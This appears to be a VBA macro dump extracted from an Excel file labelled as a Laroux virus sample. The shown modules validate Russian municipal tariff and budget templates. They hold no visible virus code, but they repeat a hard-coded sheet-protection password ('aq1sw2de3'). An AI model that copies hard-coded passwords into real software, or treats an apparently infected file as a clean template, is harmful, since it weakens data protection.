col_org = WB_AT.Sheets(sh1).Range("B1").Value
ws_rez.Unprotect "aq1sw2de3"

If Len(Rezult) = 0 Then
    WB_SV.Activate
    ws_sp.Activate
    WB_AT.Close False
ElseIf Rezult = "Данный шаблон загружен, но данные в нем удовлетворяют не всем ПРЕДУПРЕЖДАЮЩИМ условиям проверки! Смотрите комментарии на листе 'Проверка' данного шаблона от МО!" Then
    ws_rez.Hyperlinks.Add Anchor:=ws_rez.cells(NumRow, 1), Address:="", SubAddress:= _
"'Ошибки загрузки'!A1", TextToDisplay:=WB_AT.FullName
    ws_rez.cells(NumRow, 1).Font.Size = 9
    ws_rez.cells(NumRow, 3).Value = Rezult
    WB_SV.Activate
    ws_rez.Activate
    ws_rez.Range("A" & NumRow & ":C" & NumRow).Select
    WB_AT.Close False
Else
    ws_rez.Hyperlinks.Add Anchor:=ws_rez.cells(NumRow, 1), Address:="", SubAddress:= _
"'Ошибки загрузки'!A1", TextToDisplay:=WB_AT.FullName
    ws_rez.cells(NumRow, 1).Font.Size = 9
    ws_rez.cells(NumRow, 2).Value = Rezult
    WB_SV.Activate
    ws_rez.Activate
    ws_rez.Range("A" & NumRow & ":C" & NumRow).Select
    WB_AT.Close False
End If
ws_rez.Protect DrawingObjects:=False, Password:="aq1sw2de3", AllowFormattingColumns:=True, AllowFormattingRows:=True

End Sub

' проверка на уникальность организаций в атомарном шаблоне
Function checkUnicalOrgAt(WB_AT As Workbook) As Long

Dim ws As Worksheet
Dim i1 As Integer
Dim i2 As Integer
Dim i3 As Integer

Dim sovp As Integer             ' количество совпадений
Dim RecvizitAt(6) As String     ' 7 - идентифицирующих организаций

Set ws = WB_AT.Worksheets(sh1)

sovp = 0
checkUnicalOrgAt = 1            ' совпадений нет

' цикл с первой по ПРЕДпоследнюю организацию в атомаре
For i1 = 13 To 13 + ws.cells(1, 1).Value - 1
    ' переносим реквизиты текущей организации в массив
    For i2 = 1 To 6
        RecvizitAt(i2) = Trim(LCase(ws.cells(i1, 6 + i2)))
    Next
    ' сравниваем текущую организацию со ВСЕМИ организациями, находящимися далее по списку
    For i3 = i1 + 1 To 13 + ws.cells(1, 1).Value - 1
        sovp = 0
        For i2 = 1 To 6 ' проверка на совпадение всех реквизитов
            If RecvizitAt(i2) = Trim(LCase(ws.cells(i3, 6 + i2))) Then
                sovp = sovp + 1
            Else
                Exit For
            End If
        Next
        ' если совпали все (7) реквизиты - сообщаем об этом и отклоняем шаблон из рассмотрения
        If sovp = 6 Then
            checkUnicalOrgAt = 2
            Exit Function
        End If
    Next
    
Next

End Function
-------------------------------------------------------------------------------
VBA MACRO PROV.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/PROV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Base 1
Option Explicit

Public ProvIndex As Integer
Public ProvFlagOsh As Boolean 'Есть - Ошибки - True
Public ProvFlagPr As Boolean  'Есть - Предупреждения - True

Type ProvTyp
    index As String
    r As Range
End Type
' проверка на обязательность ВВОда некоторых параметров (например, названия организации или МО)
' в случае успеха возвращает "0"
Function checkBeforSaveAll() As Integer
    
    ProvIndex = 1
    ActiveWorkbook.Sheets("Проверка").Unprotect "aq1sw2de3"
    Worksheets("Проверка").Range("A2:C65000").ClearContents
    ProvFlagOsh = False
    ProvFlagPr = False
    
    checkBeforSaveTit
    checkBeforSaveR
'    checkBeforSaveAtr
'    checkBeforSavePerSubs
    
    checkBeforSaveAll = ProvIndex
    
    ActiveWorkbook.Sheets("Проверка").Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
End Function
Sub checkBeforSaveTit()

Dim wb As Workbook
Dim ws As Worksheet
Dim ws_pr As Worksheet
Dim i As Integer

Dim cl As Range
Dim rg As Range
Set wb = Application.ActiveWorkbook
Set ws = wb.Worksheets(sh1)
Set ws_pr = wb.Worksheets("Проверка")

' задаем проверяемый диапазон
Set rg = Union(ws.Range("$I$7"), ws.Range("$I$10"), ws.Range("$K$10"))

For Each cl In rg.cells
    If IsEmpty(cl.cells(1, 1)) Or Not (Len(cl.cells(1, 1).Value) > 0) Then
        ProvIndex = ProvIndex + 1
        AddHyp cl.cells(1, 1), ProvIndex, "Не указано '" & cl.cells(1, 1).Offset(-1, 0).Value & "'!", "Ошибка"
    End If
Next

End Sub
Sub checkBeforSaveR()

'книга
Dim wb As Workbook
'листы
Dim ws1 As Worksheet
Dim ws2 As Worksheet
Dim ws4 As Worksheet
'Dim ws5 As Worksheet
'Dim ws6 As Worksheet

Dim ws_pr As Worksheet
'диапазоны
Dim rg As Range
Dim rg2 As Range
Dim rg4 As Range
'Dim rg5 As Range
'Dim rg6 As Range
'массивы и счетчик
Dim col_org As Integer
Dim i As Integer

Dim pr_arr2() As ProvTyp
Dim pr_arr4() As ProvTyp
'Dim pr_arr5() As ProvTyp
'Dim pr_arr6() As ProvTyp
'сдвиги
Dim sdv2 As Integer
Dim sdv4 As Integer
'Dim sdv5 As Integer
'Dim sdv6 As Integer
'книга
Set wb = Application.ActiveWorkbook
'листы
Set ws1 = wb.Worksheets(sh1)
Set ws2 = wb.Worksheets(sh2)
Set ws4 = wb.Worksheets(sh4)
'Set ws5 = wb.Worksheets(sh5)
'Set ws6 = wb.Worksheets(sh6)

Set ws_pr = wb.Worksheets("Проверка")

ws2.Unprotect "aq1sw2de3"
ws4.Unprotect "aq1sw2de3"
'ws5.Unprotect "aq1sw2de3"
'ws6.Unprotect "aq1sw2de3"

' диапазоны
col_org = ws1.cells(1, 1).Value

Set rg2 = ws2.Range(ws2.cells(13, 8), ws2.cells(12 + col_org, 19)) ' ГОРИЗОНТАЛЬНОЕ
Set rg4 = ws4.Range(ws4.cells(11, 11), ws4.cells(81, 10 + col_org)) ' ВЕРТИКАЛЬНОЕ

'ws5.Activate
'Set rg5 = ws5.Range(cells(13, 10), cells(12 + col_org, 15)) ' ГОРИЗОНТАЛЬНОЕ
'
'ws6.Activate
'Set rg6 = ws6.Range(cells(13, 8), cells(12 + col_org, 31)) ' ГОРИЗОНТАЛЬНОЕ

' перекрашиваем все в СТАНДАРТНЫЕ ЦВЕТА
For Each rg In rg2.cells
    If rg.Interior.ColorIndex = 38 Then
        If rg.Locked = False Then
            rg.Interior.ColorIndex = 36
        Else
            rg.Interior.ColorIndex = 35
        End If
    End If
Next

For Each rg In rg4.cells
    If rg.Interior.ColorIndex = 38 Then
        If rg.Locked = False Then
            rg.Interior.ColorIndex = 36
        Else
            rg.Interior.ColorIndex = 35
        End If
    End If
Next

'For Each rg In rg5.cells
'    If rg.Interior.ColorIndex = 38 Then
'        If rg.Locked = False Then
'            rg.Interior.ColorIndex = 36
'        Else
'            rg.Interior.ColorIndex = 35
'        End If
'    End If
'Next
'
'For Each rg In rg6.cells
'    If rg.Interior.ColorIndex = 38 Then
'        If rg.Locked = False Then
'            rg.Interior.ColorIndex = 36
'        Else
'            rg.Interior.ColorIndex = 35
'        End If
'    End If
'Next

' ПРОВЕРКА НА ввод ТОЛЬКО ЧИСЛОВЫХ ЗНАЧЕНИЙ
For Each rg In rg2.cells
    If IsNumeric(rg.Value) = False Then
        PrNotStr rg
        GoTo Prot_
    End If
Next


For Each rg In rg4.cells
    If IsNumeric(rg.Value) = False Then
        PrNotStr rg
        GoTo Prot_
    End If
Next

'
'For Each rg In rg5.cells
'    If IsNumeric(rg.Value) = False Then
'        PrNotStr rg
'        GoTo Prot_
'    End If
'Next
'
'For Each rg In rg6.cells
'    If IsNumeric(rg.Value) = False Then
'        PrNotStr rg
'        GoTo Prot_
'    End If
'Next

' определяем проверочные диапазоны
sdv2 = 3
sdv4 = 4
'sdv5 = 3
'sdv6 = 3

ReDim Preserve pr_arr2(rg2.Columns.Count)
ReDim Preserve pr_arr4(rg4.Rows.Count)
'ReDim Preserve pr_arr5(rg5.Columns.Count)
'ReDim Preserve pr_arr6(rg6.Columns.Count)

For i = 1 To UBound(pr_arr2)
    Set pr_arr2(i).r = rg2.Columns(i)
    pr_arr2(i).index = rg2.cells(1, i).Offset((-1) * sdv2, 0).Value ' ГОРИЗОНТАЛЬНОЕ
Next

For i = 1 To UBound(pr_arr4)
    Set pr_arr4(i).r = rg4.Rows(i)
    pr_arr4(i).index = rg4.cells(i, 1).Offset(0, (-1) * sdv4).Value ' ВЕРТИКАЛЬНОЕ
Next

'For i = 1 To UBound(pr_arr5)
'    Set pr_arr5(i).r = rg5.Columns(i)
'    pr_arr5(i).index = rg5.cells(1, i).Offset((-1) * sdv5, 0).Value ' ГОРИЗОНТАЛЬНОЕ
'Next
'
'For i = 1 To UBound(pr_arr6)
'    Set pr_arr6(i).r = rg6.Columns(i)
'    pr_arr6(i).index = rg6.cells(1, i).Offset((-1) * sdv6, 0).Value ' ГОРИЗОНТАЛЬНОЕ
'Next

'-------Баланс------
Pr4 "1", "2", "3", "4", "=", "+", pr_arr2(), "Предупреждение" ' O+P+S=H(2+3+4=1)
'-------Смета-------
'1
PrTAndT "3.2.1.1.1", "3.2.1.1.2", pr_arr4(), "Ошибка"
'1.1
PrTAndT "3.2.1.2.1", "3.2.1.2.2", pr_arr4(), "Ошибка"

'2
PrTAndT "3.2.2.1.1", "3.2.2.1.2", pr_arr4(), "Ошибка"
'2.1
PrTAndT "3.2.2.2.1", "3.2.2.2.2", pr_arr4(), "Ошибка"

'3
PrTAndT "3.2.3.1.1", "3.2.3.1.2", pr_arr4(), "Ошибка"
'3.1
PrTAndT "3.2.3.2.1", "3.2.3.2.2", pr_arr4(), "Ошибка"

'4
PrTAndT "3.2.4.1.1", "3.2.4.1.2", pr_arr4(), "Ошибка"
'4.1
PrTAndT "3.2.4.2.1", "3.2.4.2.2", pr_arr4(), "Ошибка"

'5
PrTAndT "3.2.5.1.1", "3.2.5.1.2", pr_arr4(), "Ошибка"
'5.1
PrTAndT "3.2.5.2.1", "3.2.5.2.2", pr_arr4(), "Ошибка"

'6
Pr4 "3.6", "3.6.1", "3.6.2", "3.6.3", ">=", "+", pr_arr4(), "Ошибка"
'7
Pr3 "3.7", "3.7.1", "3.7.2", ">=", "+", pr_arr4(), "Ошибка"
'8
Pr3 "3.10", "3.10.1", "3.10.2", ">=", "+", pr_arr4(), "Ошибка"
'9
Pr2 "5.1", "5.1.1", ">=", pr_arr4(), "Ошибка"
'10
Pr2 "5.5", "5.5.1", ">=", pr_arr4(), "Ошибка"

''11-НЕОБ
'PrBetConst "3.2.1.1.1", 1, 4, pr_arr4(), "Предупреждение"
''12-НЕОБ
'PrBetConst "3.2.2.1.1", 1, 4, pr_arr4(), "Предупреждение"
''13-НЕОБ
'PrBetConst "3.2.3.1.1", 1, 4, pr_arr4(), "Предупреждение"
''14-НЕОБ
'PrBetConst "3.2.4.1.1", 1, 4, pr_arr4(), "Предупреждение"
''15-НЕОБ
'PrBetConst "3.2.5.1.1", 1, 4, pr_arr4(), "Предупреждение"
'16-НЕОБ
PrDelConst "5", "3", "<", 0.3, pr_arr4(), "Предупреждение"
'17-НЕОБ
PrTovPr "7", pr_arr4(), "Ошибка" ' ДОБАВИЛИ ИЗ-ЗА ОТСУТСТВИЯ ФОРМУЛЫ
'PrDelBetConst "3", "2", 0.002, 0.1, pr_arr4(), "Предупреждение"

''-------- Тарифы и надбавки --------
''1
'PrTAndT "3.1", "5", pr_arr5(), "Ошибка"
''2
'PrTAndT "4.1", "6", pr_arr5(), "Ошибка"
''3-НЕОБ
'Pr2 "6", "5", "<=", pr_arr5(), "Предупреждение"
''4-НЕОБ
''PrBetConst "3.1", 2, 100, pr_arr5(), "Предупреждение"
''5
'PrDelConst "4.1", "3.1", "<", 0.2, pr_arr5(), "Предупреждение"
'
''-------- Перекрестное субсидирование --------
''1
'PrSled "1.1", "2.1.1", pr_arr6(), "Ошибка"
''2
'PrSled "1.1", "3.1.1", pr_arr6(), "Ошибка"
''3
'PrSled "1.1", "4.1.1", pr_arr6(), "Ошибка"
''4
'PrSled "1.1", "5.1.1", pr_arr6(), "Ошибка"
''5
'PrTAndT "2.1.1", "2.2", pr_arr6(), "Ошибка"
''6
'PrTAndT "3.1.1", "3.2", pr_arr6(), "Ошибка"
''7
'PrSled "3.1.1", "3.3", pr_arr6(), "Ошибка"
''8
'PrTAndT "4.1.1", "4.2", pr_arr6(), "Ошибка"
''9
'PrSled "4.1.1", "4.3", pr_arr6(), "Ошибка"
''10
'PrTAndT "5.1.1", "5.2", pr_arr6(), "Ошибка"
''11
'PrSled "5.1.1", "5.3", pr_arr6(), "Ошибка"
'
''12-НЕОБ
'PrBetConst "1.1", 2, 100, pr_arr6(), "Предупреждение"
''13-НЕОБ
'PrBetConst "2.1.1", 2, 100, pr_arr6(), "Предупреждение"
''14-НЕОБ
'PrBetConst "3.1.1", 2, 100, pr_arr6(), "Предупреждение"
''15-НЕОБ
'PrBetConst "4.1.1", 2, 100, pr_arr6(), "Предупреждение"
''16-НЕОБ
'PrBetConst "5.1.1", 2, 100, pr_arr6(), "Предупреждение"


Prot_:
ws2.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
ws4.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws5.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws6.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
End Sub
' Проверка на ввод комментариев на листе -Перекрестное субсидирование-
Sub checkBeforSaveAtr()

Dim wb As Workbook
Dim ws1 As Worksheet
Dim ws5 As Worksheet
Dim ws_pr As Worksheet
Dim i As Integer
Dim col_org As Integer
Dim cl As Range
Dim rg As Range

Set wb = Application.ActiveWorkbook

Set ws1 = wb.Worksheets(sh1)
Set ws5 = wb.Worksheets(sh5)
Set ws_pr = wb.Worksheets("Проверка")

ws5.Unprotect "aq1sw2de3"
On Error GoTo Prot_
' задаем проверяемый диапазон
col_org = ws1.cells(1, 1).Value ' определяем КОЛИЧЕСТВО ОРГАНИЗАЦИЙ

For i = 1 To col_org
    ' ТАРИФ
    If (Len(ws5.cells(12 + i, 8).Value) = 0 And Len(ws5.cells(12 + i, 10).Value) > 0) Or (Len(ws5.cells(12 + i, 8).Value) > 0 And Len(ws5.cells(12 + i, 10).Value) = 0) Then
        ProvIndex = ProvIndex + 1
        AddHyp ws5.cells(12 + i, 8), ProvIndex, "Атрибуты решений по тарифу(п.1) и сам тариф (п.3.1) должны быть указаны, или не указаны - одновременно!", "Ошибка"
        ws5.cells(12 + i, 8).Interior.ColorIndex = 38
    Else
        ws5.cells(12 + i, 8).Interior.ColorIndex = 34
    End If
    
    ' НАДБАВКА
    If (Len(ws5.cells(12 + i, 9).Value) > 0 And Len(ws5.cells(12 + i, 12).Value) = 0) Or (Len(ws5.cells(12 + i, 9).Value) = 0 And Len(ws5.cells(12 + i, 12).Value) > 0) Then
        ProvIndex = ProvIndex + 1
        AddHyp ws5.cells(12 + i, 9), ProvIndex, "Атрибуты решений по надбавке к тарифу(п.2) и сам тариф (п.4.1) должны быть указаны, или не указаны - одновременно!", "Ошибка"
        ws5.cells(12 + i, 9).Interior.ColorIndex = 38
    Else
        ws5.cells(12 + i, 9).Interior.ColorIndex = 34
    End If
Next

Prot_:
ws5.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub
' Проверка на ввод комментариев на листе -Перекрестное субсидирование-
Sub checkBeforSavePerSubs()

Dim wb As Workbook
Dim ws1 As Worksheet
Dim ws6 As Worksheet
Dim ws_pr As Worksheet
Dim i As Integer
Dim col_org As Integer
Dim cl As Range
Dim rg As Range

Set wb = Application.ActiveWorkbook

Set ws1 = wb.Worksheets(sh1)
Set ws6 = wb.Worksheets(sh6)
Set ws_pr = wb.Worksheets("Проверка")

ws6.Unprotect "aq1sw2de3"
On Error GoTo Prot_
' задаем проверяемый диапазон
col_org = ws1.cells(1, 1).Value ' определяем КОЛИЧЕСТВО ОРГАНИЗАЦИЙ

For i = 1 To col_org
    If Len(ws6.cells(12 + i, 36).Value) = 0 And (ws6.cells(12 + i, 30).Value > 10 Or ws6.cells(12 + i, 30).Value < -10) Then
        ProvIndex = ProvIndex + 1
        AddHyp ws6.cells(12 + i, 36), ProvIndex, "Не указана причина невыполнения баланса перекрестного субсидирования (причина должна указываться из-за невыполнения условия -10 < п.8 < 10)!", "Ошибка"
        ws6.cells(12 + i, 36).Interior.ColorIndex = 38
    Else
        ws6.cells(12 + i, 36).Interior.ColorIndex = 34
    End If
Next

Prot_:
ws6.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub

'п.6 <= п.5
Sub Pr2(Ind1 As String, Ind2 As String, ZnLog As String, Diap() As ProvTyp, obz As String)

'Dim m_pr() As Prov
Dim R1 As Range
Dim R2 As Range
Dim R3 As Range

Dim rg As Range

Dim i As Integer


Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())

For i = 1 To R1.cells.Count
    If LogOper2(R1.cells(i).Value, R2.cells(i).Value, ZnLog) = False Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п." & Ind1 & ZnLog & " п." & Ind2, obz
        okraska R1.cells(i), R2.cells(i), Nothing, Nothing, Nothing
    End If
Next

End Sub
'ст.4 / ст.3 < 0.3
Sub PrDelConst(Ind1 As String, Ind2 As String, ZnLog As String, Cst As Double, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim R2 As Range

Dim rg As Range

Dim i As Integer


Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())

For i = 1 To R1.cells.Count
    If R1.cells(i).Value > 0 And LogOper2(R1.cells(i).Value, R2.cells(i).Value * Cst, ZnLog) = False Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п." & Ind1 & " / " & "п." & Ind2 & ZnLog & Cst, obz
        okraska R1.cells(i), R2.cells(i), Nothing, Nothing, Nothing
    End If
Next

End Sub
'1 < ст.3.2.6.1 < 4
Sub PrBetConst(Ind As String, Cst1 As Double, Cst2 As Double, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim rg As Range
Dim i As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind, Diap())

For i = 1 To R1.cells.Count
    If Len(R1.cells(i).Value) > 0 And R1.cells(i).Value > 0 And (R1.cells(i).Value <= Cst1 Or R1.cells(i).Value >= Cst2) Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' :" & Cst1 & "< п." & Ind & "< " & Cst2, obz
        okraska R1.cells(i), Nothing, Nothing, Nothing, Nothing
    End If
Next

End Sub
'ст.3.10 >= ст.3.10.1 + ст.3.10.2
Sub Pr3(Ind1 As String, Ind2 As String, Ind3 As String, ZnLog As String, ZnM As String, Diap() As ProvTyp, obz As String)

'Dim m_pr() As Prov
Dim R1 As Range
Dim R2 As Range
Dim R3 As Range

Dim rg As Range

Dim i As Integer
Dim k As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())
Set R3 = R_po_Ind(Ind3, Diap())

For i = 1 To R1.cells.Count
    If LogOper2(R1.cells(i).Value, MathOper2(R2.cells(i).Value, R3.cells(i).Value, ZnM), ZnLog) = False Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п." & Ind1 & ZnLog & " п." & Ind2 & ZnM & " п." & Ind3, obz
        okraska R1.cells(i), R2.cells(i), R3.cells(i), Nothing, Nothing
    End If
Next

End Sub
'ст.3.6 >= ст.3.6.1 + ст.3.6.2 + ст.3.6.3
Sub Pr4(Ind1 As String, Ind2 As String, Ind3 As String, Ind4 As String, ZnLog As String, ZnM As String, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim R2 As Range
Dim R3 As Range
Dim R4 As Range

Dim rg As Range

Dim i As Integer
Dim k As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())
Set R3 = R_po_Ind(Ind3, Diap())
Set R4 = R_po_Ind(Ind4, Diap())


    For i = 1 To R1.cells.Count
    'MsgBox MathOper3(R2.cells(i).Value, r3.cells(i).Value, r4.cells(i).Value, ZnM)
        If LogOper2(R1.cells(i).Value, MathOper3(R2.cells(i).Value, R3.cells(i).Value, R4.cells(i).Value, ZnM), ZnLog) = False Then
            ProvIndex = ProvIndex + 1
            AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п." & Ind1 & ZnLog & " п." & Ind2 & ZnM & " п." & Ind3 & ZnM & " п." & Ind4, obz
            okraska R1.cells(i), R2.cells(i), R3.cells(i), R4.cells(i), Nothing
        End If
    Next


End Sub
' поиск ДИАПАЗОНА
Function R_po_Ind(Ind As String, Diap() As ProvTyp) As Range


Dim i As Integer

For i = 1 To UBound(Diap)
    If Diap(i).index = Ind Then
        Set R_po_Ind = Diap(i).r
        Exit Function
    End If
Next

End Function
' TRUE если условие верно
Function LogOper2(Op1 As Double, Op2 As Double, Zn As String) As Boolean
LogOper2 = False
Select Case Zn    ' Evaluate Number.

Case ">"
    If Op1 > Op2 Then LogOper2 = True
    
Case ">="
    If Op1 >= Op2 Or Abs(Op1 - Op2) < 0.0001 Then LogOper2 = True
    
Case "="
    If Abs(Op1 - Op2) < 0.0001 Then
        LogOper2 = True
    End If
    
Case "<="
    If Op1 <= Op2 Or Abs(Op1 - Op2) < 0.0001 Then LogOper2 = True
    
Case "<"
    If Op1 < Op2 Then LogOper2 = True
End Select

End Function


' возвращает результат АРИФМ операции
Function MathOper2(Op1 As Double, Op2 As Double, Zn As String) As Double
Select Case Zn
Case "+"
    MathOper2 = Op1 + Op2
Case "-"
    MathOper2 = Op1 - Op2
Case "/"
    MathOper2 = Op1 / Op2
Case "*"
    MathOper2 = Op1 * Op2
End Select

End Function
' возвращает результат АРИФМ операции
Function MathOper3(Op1 As Double, Op2 As Double, Op3 As Double, Zn As String) As Double
Select Case Zn
Case "+"
    MathOper3 = Op1 + Op2 + Op3
Case "-"
    MathOper3 = Op1 - Op2 - Op3
Case "/"
    MathOper3 = Op1 / Op2 / Op3
Case "*"
    MathOper3 = Op1 * Op2 * Op3
End Select

End Function

' проверка на принадлежность элемента списку
'rg1 - проверяемая ячейка, rg2 - ячейка куда вставляется гиперссылка на листе "Проверка"
Sub AddHyp(rg1 As Range, i As Integer, prich As String, obz As String)
        Dim ws_pr As Worksheet
        Dim rg2 As Range
        
        Set ws_pr = Application.Worksheets("Проверка")
        Set rg2 = ws_pr.cells(i, 1)
        ws_pr.Activate
        rg2.Select
        
        rg2.Worksheet.Hyperlinks.Add Anchor:=Selection, Address:="", SubAddress:="'" & rg1.Worksheet.name & "'!" & rg1.Address(RowAbsolute:=False, ColumnAbsolute:=False), TextToDisplay:=rg1.Worksheet.name & "!" & rg1.Address(RowAbsolute:=False, ColumnAbsolute:=False)
    If obz = "Ошибка" Then
        ProvFlagOsh = True
    Else
        ProvFlagPr = True
    End If
    With rg2.Font
        .name = "Tahoma"
        .FontStyle = "полужирный"
        .Size = 9
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleSingle
        .ColorIndex = 5
    End With
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = False
    End With
    rg2.Offset(0, 1).Value = prich
    rg2.Offset(0, 2).Value = obz
    rg2.Worksheet.Rows(rg2.Row & ":" & rg2.Row).EntireRow.AutoFit
End Sub
' раскрасить ячейки, которые вызывают сомнение
Sub okraska(R1 As Range, R2 As Range, R3 As Range, R4 As Range, r5 As Range)
    R1.Interior.ColorIndex = 38
    On Error Resume Next
    R2.Interior.ColorIndex = 38
    R3.Interior.ColorIndex = 38
    R4.Interior.ColorIndex = 38
    r5.Interior.ColorIndex = 38
End Sub

' ст.3.2.2.1=0  <=> ст.3.2.2.2=0
Sub PrTAndT(Ind1 As String, Ind2 As String, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim R2 As Range

Dim rg As Range
Dim i As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())

For i = 1 To R1.cells.Count
    If (R1.cells(i).Value = 0 And R2.cells(i).Value > 0) Or (R1.cells(i).Value > 0 And R2.cells(i).Value = 0) Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п. " & Ind1 & "=0 <=> п. " & Ind2 & "=0 (п. " & Ind1 & " и п. " & Ind2 & " должны быть заполнены (не равны нулю) одновременно)", obz
        okraska R1.cells(i), R2.cells(i), Nothing, Nothing, Nothing
    End If
Next

End Sub
' реакция на то, что в ячейке НЕ числовое значение
Sub PrNotStr(R_err As Range)
        ProvIndex = ProvIndex + 1
        AddHyp R_err, ProvIndex, "Нечисловое значение!", "Ошибка"
        okraska R_err, Nothing, Nothing, Nothing, Nothing
End Sub

'200 < ст.15 / ст.17*1000 < 3000
Sub PrDelBetConst(Ind1 As String, Ind2 As String, Cst1 As Double, Cst2 As Double, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim R2 As Range

Dim rg As Range

Dim i As Integer
Dim k As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())

    For i = 1 To R1.cells.Count
        If R2.cells(i).Value > 0 Then
            If (R1.cells(i).Value / R2.cells(i).Value) <= Cst1 Or R1.cells(i).Value / R2.cells(i).Value >= Cst2 Then
                ProvIndex = ProvIndex + 1
                AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "':" & Cst1 & "< п." & Ind1 & "/п." & Ind2 & " <" & Cst2, obz
                okraska R1.cells(i), R2.cells(i), Nothing, Nothing, Nothing
            End If
        End If
    Next


End Sub

' 2.1.1 = 0 (или null) => 2.2.1 = 0 (или null)(ЕСЛИ..., ТО..)
Sub PrSled(Ind1 As String, Ind2 As String, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim R2 As Range

Dim rg As Range
Dim i As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind1, Diap())
Set R2 = R_po_Ind(Ind2, Diap())

For i = 1 To R1.cells.Count
    If (R1.cells(i).Value = 0 And R2.cells(i).Value > 0) Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не выполняется условие на листе '" & R1.Worksheet.name & "' : п. " & Ind1 & "=0 => п. " & Ind2 & "=0 ( если п. " & Ind1 & " равен 0(не заполнен), то п. " & Ind2 & " также должен быть равен 0(не заполнен))", obz
        okraska R1.cells(i), Nothing, Nothing, Nothing, Nothing
    End If
Next

End Sub

'НАЛИЧИЕ ЗНАЧЕНИЯ ТОВАРНОЙ ПРОДУКЦИИ
Sub PrTovPr(Ind As String, Diap() As ProvTyp, obz As String)

Dim R1 As Range
Dim rg As Range
Dim i As Integer

Dim col_org As Integer

Set R1 = R_po_Ind(Ind, Diap())

For i = 1 To R1.cells.Count
     If Len(R1.cells(i).Value) = 0 Then
        ProvIndex = ProvIndex + 1
        AddHyp R1.cells(i), ProvIndex, "Не указано значение на листе '" & R1.Worksheet.name & "' - п. " & Ind & ". Товарная продукция без НДС", obz
        okraska R1.cells(i), Nothing, Nothing, Nothing, Nothing
    End If
Next

End Sub

-------------------------------------------------------------------------------
VBA MACRO Лист13.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ДОБАВИТЬ ДАННЫЕ ИЗ ВСЕХ ФАЙЛОВ ДАННОЙ ПАПКИ
Private Sub LoadAllCmd_Click()
On Error GoTo Err_Open_
Dim WB_SV As Workbook
Dim WB_AT As Workbook
        Application.EnableEvents = False
        Set WB_SV = ThisWorkbook
        ' ПРОВЕРКА НА КОРРЕКТНЫЙ ВВОД ПАПКИ
If Len(WB_SV.Sheets("Свод").Range("Papka").cells(1, 1).Value) < 4 Then
    MsgBox "Вы не указали путь к папке с заполненными шаблонами!", vbCritical
    WB_SV.Sheets("Свод").Activate
    WB_SV.Sheets("Свод").Range("Papka").cells(1, 1).Select
    GoTo Err_Open_
    Exit Sub
ElseIf Len(WB_SV.Sheets(sh1).Range("I10").Value) = 0 Or Len(WB_SV.Sheets(sh1).Range("K10").Value) = 0 Then ' проверка на ввод МО и ОКТМО
    WB_SV.Sheets(sh1).Activate
    WB_SV.Sheets(sh1).Range("I10:K10").Select
    MsgBox "Перед началом загрузки необходимо выбрать МО и ОКТМО на листе 'Список организаций' !", vbCritical
    GoTo Err_Open_
